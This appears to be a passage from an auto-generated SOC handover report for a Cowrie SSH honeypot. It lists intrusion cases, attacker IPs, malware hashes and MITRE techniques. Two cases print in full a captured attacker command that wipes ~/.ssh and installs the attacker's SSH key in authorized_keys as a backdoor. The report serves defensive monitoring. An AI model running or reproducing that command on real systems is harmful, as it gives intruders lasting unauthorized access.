|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:47 |
| **Last Seen** | 2026-05-24 20:47 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:47:36` | `cowrie.session.connect` |
| `2026-05-24 20:47:36` | `cowrie.client.version` |
| `2026-05-24 20:47:37` | `cowrie.client.kex` |
| `2026-05-24 20:47:38` | `cowrie.login.success` |
| `2026-05-24 20:47:38` | `cowrie.session.params` |
| `2026-05-24 20:47:38` | `cowrie.command.input` |
| `2026-05-24 20:47:38` | `cowrie.command.failed` |
| `2026-05-24 20:47:39` | `cowrie.log.closed` |
| `2026-05-24 20:47:39` | `cowrie.session.params` |
| `2026-05-24 20:47:39` | `cowrie.command.input` |
| `2026-05-24 20:47:39` | `cowrie.session.file_download` |
| `2026-05-24 20:47:39` | `cowrie.log.closed` |
| `2026-05-24 20:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2093894ad7e

| Field | Detail |
|---|---|
| **Source IP** | `174.35.25[.]178` |
| **First Seen** | 2026-05-24 20:47 |
| **Last Seen** | 2026-05-24 20:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:47:43` | `cowrie.session.connect` |
| `2026-05-24 20:47:43` | `cowrie.client.version` |
| `2026-05-24 20:47:43` | `cowrie.client.kex` |
| `2026-05-24 20:47:44` | `cowrie.login.success` |
| `2026-05-24 20:47:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `174.35.25[.]178` to AbuseIPDB if not already reported
- [ ] Block `174.35.25[.]178` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48fd050ec80d

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:56 |
| **Last Seen** | 2026-05-24 20:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:56:58` | `cowrie.session.connect` |
| `2026-05-24 20:56:58` | `cowrie.client.version` |
| `2026-05-24 20:56:58` | `cowrie.client.kex` |
| `2026-05-24 20:56:59` | `cowrie.login.success` |
| `2026-05-24 20:57:00` | `cowrie.session.params` |
| `2026-05-24 20:57:00` | `cowrie.command.input` |
| `2026-05-24 20:57:00` | `cowrie.command.failed` |
| `2026-05-24 20:57:00` | `cowrie.log.closed` |
| `2026-05-24 20:57:01` | `cowrie.session.params` |
| `2026-05-24 20:57:01` | `cowrie.command.input` |
| `2026-05-24 20:57:01` | `cowrie.session.file_download` |
| `2026-05-24 20:57:01` | `cowrie.log.closed` |
| `2026-05-24 20:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cffbcdebc0b0

| Field | Detail |
|---|---|
| **Source IP** | `186.251.71[.]202` |
| **First Seen** | 2026-05-24 20:57 |
| **Last Seen** | 2026-05-24 20:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 20:57:05` | `cowrie.session.connect` |
| `2026-05-24 20:57:05` | `cowrie.client.version` |
| `2026-05-24 20:57:06` | `cowrie.client.kex` |
| `2026-05-24 20:57:07` | `cowrie.login.success` |
| `2026-05-24 20:57:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.251.71[.]202` to AbuseIPDB if not already reported
- [ ] Block `186.251.71[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `14.1.106[.]25` | **25** | 2026-05-24 20:10 | 2026-05-24 20:15 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `103.31.39[.]72` | **15** | 2026-05-24 19:38 | 2026-05-24 19:44 | 0m | 15 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `161.35.217[.]121` | **14** | 2026-05-24 19:26 | 2026-05-24 20:17 | 11m | 0 | `T1592` | 🟠 MEDIUM |
| `186.251.71[.]202` | **13** | 2026-05-24 19:31 | 2026-05-24 20:57 | 0m | 13 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `101.47.156[.]21` | **6** | 2026-05-24 19:23 | 2026-05-24 19:43 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `89.43.134[.]146` | **5** | 2026-05-24 19:31 | 2026-05-24 19:40 | 8m | 0 | `T1592` | 🟢 LOW |
| `172.172.180[.]124` | **2** | 2026-05-24 19:27 | 2026-05-24 19:48 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.109.9[.]162` | **2** | 2026-05-24 19:24 | 2026-05-24 19:26 | 2m | 0 | `T1592` | 🟢 LOW |
| `101.126.17[.]72` | 1 | 2026-05-24 20:52 | 2026-05-24 20:54 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.106.79[.]66` | 1 | 2026-05-24 19:39 | 2026-05-24 19:39 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.58.173[.]254` | 1 | 2026-05-24 19:24 | 2026-05-24 19:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `112.132.249[.]164` | 1 | 2026-05-24 20:47 | 2026-05-24 20:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.109[.]159` | 1 | 2026-05-24 19:37 | 2026-05-24 19:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.150.93[.]157` | 1 | 2026-05-24 20:04 | 2026-05-24 20:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.148.120[.]187` | 1 | 2026-05-24 20:42 | 2026-05-24 20:44 | 92s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `14.1.106[.]25` | PK | Cyber Internet Services Pakistan | **100** ⚠️ | 6 |
| `74.109.9[.]162` | US | Verizon Business | **100** ⚠️ | 0 |
| `161.35.217[.]121` | DE | DigitalOcean, LLC | **100** ⚠️ | 0 |
| `106.58.173[.]254` | CN | CHINANET YunNan PROVINCE NETWORK | **100** ⚠️ | 50 |
| `186.251.71[.]202` | BR | PW INFORMATICA E TECNOLOGIA LTDA | **100** ⚠️ | 50 |
| `172.172.180[.]124` | US | Microsoft Limited | **100** ⚠️ | 14 |
| `219.150.93[.]157` | CN | XINXIBAN-LTD. | **100** ⚠️ | 50 |
| `101.126.17[.]72` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 1 |
| `123.58.219[.]3` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 30 |
| `120.48.109[.]159` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 115 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 63 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 47 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 24 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 24 |

---

## 🔕 False Positive Summary (83 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 31 |
| AbuseIPDB score 16 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 50 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 219 cases |
| Tool 34  | Credential Extractor        | ✅ 110 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 3 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 83 filtered (37.9%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 25 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 47 priority case(s) shown individually · 15 recon entry/entries in table (8 group(s) consolidating 82 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-24T21:01:12Z_
